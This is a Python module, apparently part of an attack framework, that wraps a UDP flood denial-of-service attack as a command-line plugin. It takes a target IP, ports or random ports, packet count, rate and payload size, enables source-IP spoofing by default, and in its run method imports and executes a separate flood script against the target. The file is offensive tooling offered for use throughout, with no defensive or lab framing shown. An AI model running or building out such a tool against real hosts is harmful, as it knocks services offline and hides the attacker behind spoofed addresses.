"""UDP Flood attack implementation"""

import argparse
import sys
import os
from typing import Optional, Dict, Any
import logging

from .base import AttackBase

logger = logging.getLogger(__name__)

class UdpFlood(AttackBase):
    """UDP Flood attack implementation"""

    name = "udp-flood"
    description = "Perform UDP flood attack"

    def add_arguments(self, parser: argparse.ArgumentParser) -> None:
        # Target configuration
        target_group = parser.add_argument_group('Target Configuration')
        target_group.add_argument('--target', required=True, help='Target IP address')
        target_group.add_argument('--port', type=int, help='Target port')
        target_group.add_argument('--port-range', help='Port range to attack (e.g., 1000-2000)')
        target_group.add_argument('--random-ports', action='store_true', help='Use random destination ports')

        # Attack behavior
        behavior_group = parser.add_argument_group('Attack Behavior')
        behavior_group.add_argument('--count', type=int, default=1000, help='Number of packets to send')
        behavior_group.add_argument('--rate', type=int, default=100, help='Packets per second')
        behavior_group.add_argument('--payload-size', type=int, default=512, help='Payload size in bytes (max: 65507)')
        behavior_group.add_argument('--spoof', action='store_true', default=True, help='Use random source IPs')
        behavior_group.add_argument('--no-spoof', dest='spoof', action='store_false', help='Disable IP spoofing')

        # Monitoring and output
        monitor_group = parser.add_argument_group('Monitoring')
        monitor_group.add_argument('--verbose', action='store_true', help='Enable verbose output')

    def validate(self, args: argparse.Namespace) -> bool:
        # Validate target IP
        if not self.validator.validate_ip(args.target, allow_private=True, allow_loopback=False):
            logger.error(f"Invalid target IP address: {args.target}")
            return False

        # Validate port configuration
        if args.random_ports:
            # Random ports selected, no need for specific port validation
            pass
        elif args.port_range:
            try:
                start_port, end_port = map(int, args.port_range.split('-'))
                if not all(self.validator.validate_port(p) for p in [start_port, end_port]):
                    logger.error(f"Invalid port range: {args.port_range}")
                    return False
                if start_port >= end_port:
                    logger.error(f"Invalid port range: start port must be less than end port")
                    return False
            except ValueError:
                logger.error(f"Invalid port range format. Use start-end (e.g., 1000-2000)")
                return False
        elif args.port:
            if not self.validator.validate_port(args.port):
                logger.error(f"Invalid port number: {args.port}")
                return False
        else:
            logger.error("Must specify either --port, --port-range, or --random-ports")
            return False

        # Validate numeric parameters
        if args.count <= 0:
            logger.error(f"Invalid packet count: {args.count}")
            return False
        if args.rate <= 0:
            logger.error(f"Invalid rate: {args.rate}")
            return False
        if args.payload_size < 0 or args.payload_size > 65507:
            logger.error(f"Invalid payload size: {args.payload_size} (must be 0-65507)")
            return False

        return True

    def run(self, args: argparse.Namespace) -> None:
        # Import the original attack script
        scripts_dir = os.path.join(os.path.dirname(os.path.dirname(os.path.dirname(__file__))), 'scripts')
        udp_flood_path = os.path.join(scripts_dir, 'udp_flood')

        sys.path.insert(0, udp_flood_path)
        try:
            import udp_flood as attack_module

            # Prepare ports list
            if args.random_ports:
                ports = []
                random_ports = True
            elif args.port_range:
                start_port, end_port = map(int, args.port_range.split('-'))
                ports = list(range(start_port, end_port + 1))
                random_ports = False
            else:
                ports = [args.port]
                random_ports = False

            # Create attack instance
            attack = attack_module.UDPFloodAttack(
                target_ip=args.target,
                ports=ports,
                packet_count=args.count,
                rate=args.rate,
                payload_size=args.payload_size,
                spoof_ip=args.spoof,
                random_ports=random_ports,
                verbose=args.verbose
            )

            # Run the attack
            logger.info(f"Running UDP flood attack against {args.target}")
            attack.execute()

        except ImportError as e:
            logger.error(f"Failed to import UDP flood attack script: {str(e)}")
            raise
        except Exception as e:
            logger.error(f"Attack failed: {str(e)}")
            raise
        finally:
            sys.path.remove(udp_flood_path)
